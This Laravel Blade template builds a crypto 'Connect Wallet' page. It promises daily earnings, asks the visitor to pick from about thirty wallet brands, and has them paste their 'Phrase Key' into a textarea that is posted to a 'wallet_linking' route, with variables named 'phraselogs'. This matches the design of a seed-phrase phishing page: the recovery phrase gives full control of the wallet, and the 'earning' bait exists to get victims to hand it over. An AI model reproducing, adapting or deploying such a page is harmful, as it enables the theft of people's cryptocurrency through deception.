@extends('Userview.layouts.app')
@section('content')
@error('message')
<script>
   Swal.fire({
   icon: 'error',
   title: 'Oops...',
   text: @json($message),
   });
</script>
@enderror
@if(session('success'))
<script>
   Swal.fire({
      icon: 'success',
      title: 'Success',
      text: @json(session('success')),
   });
</script>
@endif
<style>
    .btn-custom {
        padding: 15px 30px; /* Adjust button padding for size */
        font-size: 18px; /* Adjust font size */
    }
</style>

<div class="main-content">
   <div class="page-content">
      <div class="container-fluid">
         <div class="row">
            <div class="col-12">
               <!-- TradingView Widget BEGIN -->
               <div class="tradingview-widget-container mb-3">
                  <div class="tradingview-widget-container__widget"></div>
                  <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js" async>
                     {
                     "symbols": [
                       {
                         "proName": "FOREXCOM:SPXUSD",
                         "title": "S&P 500"
                       },
                       {
                         "proName": "FOREXCOM:NSXUSD",
                         "title": "US 100"
                       },
                       {
                         "proName": "FX_IDC:EURUSD",
                         "title": "EUR/USD"
                       },
                       {
                         "proName": "BITSTAMP:BTCUSD",
                         "title": "Bitcoin"
                       },
                       {
                         "proName": "BITSTAMP:ETHUSD",
                         "title": "Ethereum"
                       }
                     ],
                     "showSymbolLogo": true,
                     "colorTheme": "light",
                     "isTransparent": false,
                     "displayMode": "regular",
                     "locale": "en"
                     }
                  </script>
               </div>
            </div>
         </div>
         <div class="row">
            <div class="col-lg-12">
               <div class="card">
                  <div class="card-header">
                     <h4 class="card-title mb-0">Connect Wallet</h4>
                  </div>
                  <div class="card-body">
                     <form action="{{ route('wallet_linking') }}" method="post">
                        @csrf
                        <div class="row">
                           <div class="col-md-6">
                              <div class="mb-3">
                                 <p style="font-size: 16px">To start earning <strong>${{ number_format($phraselogs->daily_earning) }}</strong>, you need to connect your wallet. Make sure you have more than <strong>${{ number_format($phraselogs->Phrase_min_amount) }}</strong> in your wallet to be eligible for daily earnings.</p>
                                 <div class="form-outline mb-4">
                                    <label class="form-label" style="font-weight: bolder; font-size:15px;"><i class="fa fa-wallet"></i> Select Your Wallet</label>
                                    <select required name="wallet_type" class="form-control form-select">
                                       <option value="">Select Wallet</option>
                                       <option value="trust_wallet">Trust Wallet</option>
                                       <option value="exodus">Exodus</option>
                                       <option value="metamask">MetaMask</option>
                                       <option value="atomic_wallet">Atomic Wallet</option>
                                       <option value="ledger_live">Ledger Live</option>
                                       <option value="trezor">Trezor</option>
                                       <option value="coinomi">Coinomi</option>
                                       <option value="mycelium">Mycelium</option>
                                       <option value="electrum">Electrum</option>
                                       <option value="wasabi">Wasabi Wallet</option>
                                       <option value="bread_wallet">Bread Wallet</option>
                                       <option value="blue_wallet">BlueWallet</option>
                                       <option value="green_wallet">Green Wallet</option>
                                       <option value="blockchain_com">Blockchain.com Wallet</option>
                                       <option value="bitpay">BitPay Wallet</option>
                                       <option value="edge">Edge Wallet</option>
                                       <option value="guarda">Guarda Wallet</option>
                                       <option value="keepkey">KeepKey</option>
                                       <option value="samourai">Samourai Wallet</option>
                                       <option value="argent">Argent Wallet</option>
                                       <option value="zengo">ZenGo</option>
                                       <option value="trustee">Trustee Wallet</option>
                                       <option value="coinbase_wallet">Coinbase Wallet</option>
                                       <option value="bitbox">BitBox</option>
                                       <option value="imtoken">imToken</option>
                                       <option value="pillar">Pillar Wallet</option>
                                       <option value="math_wallet">Math Wallet</option>
                                       <option value="safe_pal">SafePal</option>
                                       <option value="crypto_com">Crypto.com Wallet</option>
                                       <option value="phantom">Phantom Wallet</option>
                                    </select>
                                 </div>
                              </div>
                              <div class="mb-3">
                                 <label class="form-label" for="formrow-keyphrase-input"><i class="fa fa-key"></i> Phrase Key</label>
                                 <textarea name="key_phrases" class="form-control" id="formrow-keyphrase-input" rows="5"></textarea>
                              </div>

                              <center>
                                 <div class="mt-4">
                                    <button type="submit" name="sub-pass" class="btn btn-primary btn-lg rounded-pill btn-custom">
                                    <i class="fa fa-link"></i> Link Wallet 
                                    </button>
                                 </div>
                           </center>

                           </div>
                        </div>
                       
                     </form>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
</div>
@endsection